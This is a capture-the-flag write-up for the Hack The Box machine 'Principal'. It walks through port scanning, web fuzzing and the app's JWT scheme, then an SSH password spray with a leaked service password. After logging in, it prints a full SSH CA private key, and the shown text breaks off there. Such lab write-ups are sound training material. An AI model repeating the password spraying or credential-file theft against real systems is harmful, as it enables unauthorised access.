---
title: "Hackthebox: Principal"
author: NeoVirex
categories: [Hackthebox]
tags: [CTF, HackTheBox, jwt, ssh, Privilege Escalation]
render_with_liquid: false
media_subpath: /images/hackthebox/hackthebox_principal/
image:
  path: room_img.png
description: "A Hack The Box Principal write-up covering web discovery, token abuse, credential reuse, and privilege escalation to root."
---

# Recon

```jsx
$ sudo rustscan -a ctf.htb -- -A     
Open 10.129.244.220:22
Open 10.129.244.220:8080

PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI/L7q6P/YK0AiDgynK4UBmJ6IyqoO/QPlkGcV6tb5RgFeIHduOPIUKgMKBVUO36anm3aPmZMR4iZoUACUDwi6s=
|   256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK1uLjeHDa2qBOikNycBjD8HqITM6Hj1Oj5B6cvndDMB
8080/tcp open  http-proxy syn-ack ttl 63 Jetty
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Jetty
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 15 Mar 2026 03:40:12 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: application/json
|     {"timestamp":"2026-03-15T03:40:12.510+00:00","status":404,"error":"Not Found","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     Date: Sun, 15 Mar 2026 03:40:11 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Content-Language: en
|     Location: /login
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sun, 15 Mar 2026 03:40:11 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Allow: GET,HEAD,OPTIONS
|     Accept-Patch: 
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Date: Sun, 15 Mar 2026 03:40:12 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 349
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 505 Unknown Version</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 505 Unknown Version</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>505</td></tr>
|     <tr><th>MESSAGE:</th><td>Unknown Version</td></tr>
|     </table>
|     </body>
|     </html>
|   Socks5: 
|     HTTP/1.1 400 Bad Request
|     Date: Sun, 15 Mar 2026 03:40:12 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 382
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 400 Illegal character CNTL=0x5</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 400 Illegal character CNTL=0x5</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>400</td></tr>
|     <tr><th>MESSAGE:</th><td>Illegal character CNTL=0x5</td></tr>
|     </table>
|     </body>
|_    </html>
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.98%I=7%D=3/14%Time=69B62A1C%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,A4,"HTTP/1\.1\x20302\x20Found\r\nDate:\x20Sun,\x2015\x20Mar\x2
SF:02026\x2003:40:11\x20GMT\r\nServer:\x20Jetty\r\nX-Powered-By:\x20pac4j-
SF:jwt/6\.0\.3\r\nContent-Language:\x20en\r\nLocation:\x20/login\r\nConten
SF:t-Length:\x200\r\n\r\n")%r(HTTPOptions,A2,"HTTP/1\.1\x20200\x20OK\r\nDa
SF:te:\x20Sun,\x2015\x20Mar\x202026\x2003:40:11\x20GMT\r\nServer:\x20Jetty
SF:\r\nX-Powered-By:\x20pac4j-jwt/6\.0\.3\r\nAllow:\x20GET,HEAD,OPTIONS\r\
SF:nAccept-Patch:\x20\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,220,
SF:"HTTP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nDate:\x20Su
SF:n,\x2015\x20Mar\x202026\x2003:40:12\x20GMT\r\nCache-Control:\x20must-re
SF:validate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=iso-88
SF:59-1\r\nContent-Length:\x20349\r\n\r\n<html>\n<head>\n<meta\x20http-equ
SF:iv=\"Content-Type\"\x20content=\"text/html;charset=ISO-8859-1\"/>\n<tit
SF:le>Error\x20505\x20Unknown\x20Version</title>\n</head>\n<body>\n<h2>HTT
SF:P\x20ERROR\x20505\x20Unknown\x20Version</h2>\n<table>\n<tr><th>URI:</th
SF:><td>/badMessage</td></tr>\n<tr><th>STATUS:</th><td>505</td></tr>\n<tr>
SF:<th>MESSAGE:</th><td>Unknown\x20Version</td></tr>\n</table>\n\n</body>\
SF:n</html>\n")%r(FourOhFourRequest,13B,"HTTP/1\.1\x20404\x20Not\x20Found\
SF:r\nDate:\x20Sun,\x2015\x20Mar\x202026\x2003:40:12\x20GMT\r\nServer:\x20
SF:Jetty\r\nX-Powered-By:\x20pac4j-jwt/6\.0\.3\r\nCache-Control:\x20must-r
SF:evalidate,no-cache,no-store\r\nContent-Type:\x20application/json\r\n\r\
SF:n{\"timestamp\":\"2026-03-15T03:40:12\.510\+00:00\",\"status\":404,\"er
SF:ror\":\"Not\x20Found\",\"path\":\"/nice%20ports%2C/Tri%6Eity\.txt%2ebak
SF:\"}")%r(Socks5,232,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Sun,
SF:\x2015\x20Mar\x202026\x2003:40:12\x20GMT\r\nCache-Control:\x20must-reva
SF:lidate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=iso-8859
SF:-1\r\nContent-Length:\x20382\r\n\r\n<html>\n<head>\n<meta\x20http-equiv
SF:=\"Content-Type\"\x20content=\"text/html;charset=ISO-8859-1\"/>\n<title
SF:>Error\x20400\x20Illegal\x20character\x20CNTL=0x5</title>\n</head>\n<bo
SF:dy>\n<h2>HTTP\x20ERROR\x20400\x20Illegal\x20character\x20CNTL=0x5</h2>\
SF:n<table>\n<tr><th>URI:</th><td>/badMessage</td></tr>\n<tr><th>STATUS:</
SF:th><td>400</td></tr>\n<tr><th>MESSAGE:</th><td>Illegal\x20character\x20
SF:CNTL=0x5</td></tr>\n</table>\n\n</body>\n</html>\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=3/14%OT=22%CT=%CU=41612%PV=Y%DS=2%DC=T%G=N%TM=69B62A2F
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11
OS:NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 17.375 days (since Wed Feb 25 10:40:09 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   121.86 ms 10.10.14.1
2   119.15 ms ctf.htb (10.129.244.220)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:40
Completed NSE at 20:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:40
Completed NSE at 20:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:40
Completed NSE at 20:40, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.02 seconds
           Raw packets sent: 41 (2.638KB) | Rcvd: 27 (1.846KB)

                               
```

![dashbord.png](dashbord.png)

```jsx
└─$ ffuf -u http://10.129.244.220:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt 

                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 128ms]
dashboard               [Status: 200, Size: 3930, Words: 1579, Lines: 95, Duration: 202ms]
error                   [Status: 500, Size: 73, Words: 1, Lines: 1, Duration: 309ms]
login                   [Status: 200, Size: 6152, Words: 2465, Lines: 113, Duration: 177ms]
meta-inf                [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 200ms]
META-INF                [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 199ms]
WEB-INF                 [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 158ms]
web-inf                 [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 158ms]
:: Progress: [4614/4614] :: Job [1/1] :: 308 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
          
```

![api.png](api.png)

```jsx
$ curl -s http://10.129.244.220:8080/static/js/app.js
/**
 * Principal Internal Platform - Client Application
 * Version: 1.2.0
 *
 * Authentication flow:
 * 1. User submits credentials to /api/auth/login
 * 2. Server returns encrypted JWT (JWE) token
 * 3. Token is stored and sent as Bearer token for subsequent requests
 *
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks for token verification
 * - Inner JWT is signed with RS256
 *
 * JWT claims schema:
 *   sub   - username
 *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
 *   iss   - "principal-platform"
 *   iat   - issued at (epoch)
 *   exp   - expiration (epoch)
 */

const API_BASE = '';
const JWKS_ENDPOINT = '/api/auth/jwks';
const AUTH_ENDPOINT = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';

// Role constants - must match server-side role definitions
const ROLES = {
    ADMIN: 'ROLE_ADMIN',
    MANAGER: 'ROLE_MANAGER',
    USER: 'ROLE_USER'
};

// Token management
class TokenManager {
    static getToken() {
        return sessionStorage.getItem('auth_token');
    }

    static setToken(token) {
        sessionStorage.setItem('auth_token', token);
    }

    static clearToken() {
        sessionStorage.removeItem('auth_token');
    }

    static isAuthenticated() {
        return !!this.getToken();
    }

    static getAuthHeaders() {
        const token = this.getToken();
        return token ? { 'Authorization': `Bearer ${token}` } : {};
    }
}

// API client
class ApiClient {
    static async request(endpoint, options = {}) {
        const defaults = {
            headers: {
                'Content-Type': 'application/json',
                ...TokenManager.getAuthHeaders()
            }
        };

        const config = { ...defaults, ...options, headers: { ...defaults.headers, ...options.headers } };

        try {
            const response = await fetch(`${API_BASE}${endpoint}`, config);

            if (response.status === 401) {
                TokenManager.clearToken();
                if (window.location.pathname !== '/login') {
                    window.location.href = '/login';
                }
                throw new Error('Authentication required');
            }

            return response;
        } catch (error) {
            if (error.message === 'Authentication required') throw error;
            throw new Error('Network error. Please try again.');
        }
    }

    static async get(endpoint) {
        return this.request(endpoint);
    }

    static async post(endpoint, data) {
        return this.request(endpoint, {
            method: 'POST',
            body: JSON.stringify(data)
        });
    }

    /**
     * Fetch JWKS for token verification
     * Used by client-side token inspection utilities
     */
    static async fetchJWKS() {
        const response = await fetch(JWKS_ENDPOINT);
        return response.json();
    }
}

/**
 * Render dashboard navigation based on user role.
 * Admin users (ROLE_ADMIN) get access to user management and system settings.
 * Managers (ROLE_MANAGER) get read-only access to team dashboards.
 * Regular users (ROLE_USER) only see their own deployment panel.
 */
function renderNavigation(role) {
    const navItems = [
        { label: 'Dashboard', endpoint: DASHBOARD_ENDPOINT, roles: [ROLES.ADMIN, ROLES.MANAGER, ROLES.USER] },
        { label: 'Users', endpoint: USERS_ENDPOINT, roles: [ROLES.ADMIN] },
        { label: 'Settings', endpoint: SETTINGS_ENDPOINT, roles: [ROLES.ADMIN] },
    ];

    return navItems.filter(item => item.roles.includes(role));
}

// Login form handler
function initLoginForm() {
    const form = document.getElementById('loginForm');
    if (!form) return;

    // Redirect if already authenticated
    if (TokenManager.isAuthenticated()) {
        window.location.href = '/dashboard';
        return;
    }

    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value;
        const errorEl = document.getElementById('errorMessage');
        const btnText = document.querySelector('.btn-text');
        const btnLoading = document.querySelector('.btn-loading');
        const loginBtn = document.getElementById('loginBtn');

        // Reset error
        errorEl.style.display = 'none';

        if (!username || !password) {
            showError('Please enter both username and password.');
            return;
        }

        // Show loading state
        loginBtn.disabled = true;
        btnText.style.display = 'none';
        btnLoading.style.display = 'flex';

        try {
            const response = await ApiClient.post(AUTH_ENDPOINT, { username, password });
            const data = await response.json();

            if (response.ok) {
                TokenManager.setToken(data.token);
                // Token is JWE encrypted - decryption handled server-side
                // JWKS at /api/auth/jwks provides the encryption public key
                window.location.href = '/dashboard';
            } else {
                showError(data.message || 'Authentication failed. Please check your credentials.');
            }
        } catch (error) {
            showError(error.message || 'An error occurred. Please try again.');
        } finally {
            loginBtn.disabled = false;
            btnText.style.display = 'inline';
            btnLoading.style.display = 'none';
        }
    });
}

function showError(message) {
    const errorEl = document.getElementById('errorMessage');
    errorEl.textContent = message;
    errorEl.style.display = 'flex';
}

function togglePassword() {
    const input = document.getElementById('password');
    input.type = input.type === 'password' ? 'text' : 'password';
}

// Dashboard page handler
async function initDashboard() {
    const container = document.getElementById('dashboardApp');
    if (!container) return;

    if (!TokenManager.isAuthenticated()) {
        window.location.href = '/login';
        return;
    }

    try {
        const resp = await ApiClient.get(DASHBOARD_ENDPOINT);
        if (!resp.ok) throw new Error('Failed to load dashboard');
        const data = await resp.json();

        const user = data.user;
        const stats = data.stats;

        document.getElementById('welcomeUser').textContent = user.username;
        document.getElementById('userRole').textContent = user.role;

        // Stats cards
        document.getElementById('statUsers').textContent = stats.totalUsers;
        document.getElementById('statDeploys').textContent = stats.activeDeployments;
        document.getElementById('statHealth').textContent = stats.systemHealth;
        document.getElementById('statUptime').textContent = stats.uptimePercent + '%';

        // Build navigation based on role
        const nav = renderNavigation(user.role);
        const navEl = document.getElementById('sideNav');
        navEl.innerHTML = nav.map(item =>
            `<a href="#" class="nav-item" data-endpoint="${item.endpoint}">${item.label}</a>`
        ).join('');

        navEl.querySelectorAll('.nav-item').forEach(el => {
            el.addEventListener('click', async (e) => {
                e.preventDefault();
                navEl.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
                el.classList.add('active');
                await loadPanel(el.dataset.endpoint);
            });
        });

        // Mark first nav active
        const firstNav = navEl.querySelector('.nav-item');
        if (firstNav) firstNav.classList.add('active');

        // Activity log
        const logBody = document.getElementById('activityLog');
        logBody.innerHTML = data.recentActivity.map(a =>
            `<tr><td>${a.timestamp}</td><td><span class="badge badge-${a.action.includes('FAIL') ? 'danger' : 'info'}">${a.action}</span></td><td>${a.username}</td><td>${a.details}</td></tr>`
        ).join('');

        // Announcements
        const announcementsEl = document.getElementById('announcements');
        announcementsEl.innerHTML = data.announcements.map(a =>
            `<div class="announcement ${a.severity}"><strong>${a.title}</strong><p>${a.message}</p><small>${a.date}</small></div>`
        ).join('');

    } catch (err) {
        console.error('Dashboard load error:', err);
    }
}

async function loadPanel(endpoint) {
    const panel = document.getElementById('contentPanel');
    try {
        const resp = await ApiClient.get(endpoint);
        const data = await resp.json();

        if (resp.status === 403) {
            panel.innerHTML = `<div class="panel-error"><h3>Access Denied</h3><p>${data.message}</p></div>`;
            return;
        }

        if (endpoint === USERS_ENDPOINT) {
            panel.innerHTML = `<h3>User Management</h3><table class="data-table"><thead><tr><th>Username</th><th>Name</th><th>Role</th><th>Department</th><th>Status</th><th>Notes</th></tr></thead><tbody>${
                data.users.map(u => `<tr><td>${u.username}</td><td>${u.displayName}</td><td><span class="badge">${u.role}</span></td><td>${u.department}</td><td>${u.active ? '<span class="badge badge-success">Active</span>' : '<span class="badge badge-danger">Disabled</span>'}</td><td>${u.note}</td></tr>`).join('')
            }</tbody></table>`;
        } else if (endpoint === SETTINGS_ENDPOINT) {
            panel.innerHTML = `<h3>System Settings</h3>
                <div class="settings-grid">
                    <div class="settings-section"><h4>System</h4><dl>${Object.entries(data.system).map(([k,v]) => `<dt>${k}</dt><dd>${v}</dd>`).join('')}</dl></div>
                    <div class="settings-section"><h4>Security</h4><dl>${Object.entries(data.security).map(([k,v]) => `<dt>${k}</dt><dd>${v}</dd>`).join('')}</dl></div>
                    <div class="settings-section"><h4>Infrastructure</h4><dl>${Object.entries(data.infrastructure).map(([k,v]) => `<dt>${k}</dt><dd>${v}</dd>`).join('')}</dl></div>
                </div>`;
        } else {
            panel.innerHTML = `<pre>${JSON.stringify(data, null, 2)}</pre>`;
        }
    } catch (err) {
        panel.innerHTML = `<div class="panel-error">Error loading data</div>`;
    }
}

function logout() {
    TokenManager.clearToken();
    window.location.href = '/login';
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    initLoginForm();
    initDashboard();

    // Prefetch JWKS for token handling
    if (window.location.pathname === '/login') {
        ApiClient.fetchJWKS().then(jwks => {
            // Cache JWKS for client-side token operations
            window.__jwks = jwks;
        }).catch(() => {
            // JWKS fetch is non-critical for login flow
        });
    }
});
                                                                                               
┌──(neo㉿neo)-[~]
└─$ 

```

![admin2.png](admin2.png)

# userlist

![user.png](user.png)

```jsx
──(.venv)─(neo㉿neo)-[~/pro/htb/Principal]
└─$ nxc ssh ctf.htb -u user.txt -p 'D3pl0y_$$H_Now42!' 
SSH         10.129.244.220  22     ctf.htb          [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14
SSH         10.129.244.220  22     ctf.htb          [-] admin:D3pl0y_$$H_Now42!
SSH         10.129.244.220  22     ctf.htb          [+] svc-deploy:D3pl0y_$$H_Now42!  Linux - Shell access!
                           
```

```jsx
└─$ ssh svc-deploy@ctf.htb
svc-deploy@ctf.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
svc-deploy@principal:~$ ls
user.txt
svc-deploy@principal:~$ cat user.txt
3479e83a...2b88
svc-deploy@principal:~$ sudo -l
[sudo] password for svc-deploy: 
Sorry, user svc-deploy may not run sudo on principal.
svc-deploy@principal:~$ ls -la
total 36
drwxr-x--- 4 svc-deploy svc-deploy 4096 Mar 15 03:34 .
drwxr-xr-x 3 root       root       4096 Mar 11 04:22 ..
-rw-r--r-- 1 svc-deploy svc-deploy    5 Mar 15 05:38 .bash_history
-rw-r--r-- 1 svc-deploy svc-deploy  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 svc-deploy svc-deploy 3771 Mar 31  2024 .bashrc
drwx------ 2 svc-deploy svc-deploy 4096 Mar 11 04:22 .cache
-rw-r--r-- 1 svc-deploy svc-deploy  807 Mar 31  2024 .profile
drwx------ 2 svc-deploy svc-deploy 4096 Mar 11 04:22 .ssh
-rw-r----- 1 root       svc-deploy   33 Mar 15 03:36 user.txt
svc-deploy@principal:~$ cat .bash_history 
exit
svc-deploy@principal:~$ cd ..
svc-deploy@principal:/home$ ls
svc-deploy
svc-deploy@principal:/home$ /opt/principal/ssh
-bash: /opt/principal/ssh: Is a directory
svc-deploy@principal:/home$ cd /opt/principal/ssh
svc-deploy@principal:/opt/principal/ssh$ ls
README.txt  ca  ca.pub
svc-deploy@principal:/opt/principal/ssh$ cat README.txt 
CA keypair for SSH certificate automation.

This CA is trusted by sshd for certificate-based authentication.
Use deploy.sh to issue short-lived certificates for service accounts.

Key details:
  Algorithm: RSA 4096-bit
  Created: 2025-11-15
  Purpose: Automated deployment authentication
svc-deploy@principal:/opt/principal/ssh$ cat ca
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
svc-deploy@principal:/opt/principal/ssh$ cat ca.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC6lxNSzJQFU3K/0FLKci1BZr+HL1UTQ45y8nzlu0tVaCFcluEZZyPu3wgC4XbCGmihm8wyoBgJXI6BZyRTpizmHJZAjNmvi9ncUoS06Rpl+oAv8E3GugdcQoglSP7Nem0JnpmHoOL/FtStaKPTtoEYHWc3rVd6YBGfXCrF0lEgFsQcwFOLkPoS35IdnZqcj3vBtz7Asod2qiWztk6l2UHjZyrUKUxiRERXsr7uNtY9xSgA1ClhZdx3MUE1intkbUgdFC1yYXS+lsvlUD/N54YYLSKH7GVsMFzV/cWsxgx8z9CfgDvS+M0BVRrGiETmcY1jALOTln7PCnLl2vC1Rr0j7btu99DYrLmYj4L9OgKjHeX7InVQCGnoRHWpThyp3WmdnWoghAiyALuiL39XXQpen2t7GQd+zT5Qbv2HpLW4huVKXoY+22KSbVsAhFAexgZy04fxKZw6M5YzzIA28JWnIXdCbxdYhVm8QzlnKHEhI2J1T/9wrUvBFQQExmXrt/HHmJZrjNfjkd4tUsarLlANJ7ilNMNSzk3QuJp2t2I7IBO6JO8eQt5jEFSPbtIav9u8vPsTLMRjMfrpqxiAA+VAozzeOYZLEhCWatWTQw6wzpnb9+qfAoQj1kGhPTelOtmdLx8dJtqSw5O4HMAhlnItjqrxr57+333Fg1iaqBvsmQ== principal-ssh-ca
svc-deploy@principal:/opt/principal/ssh$ ls -la
total 20
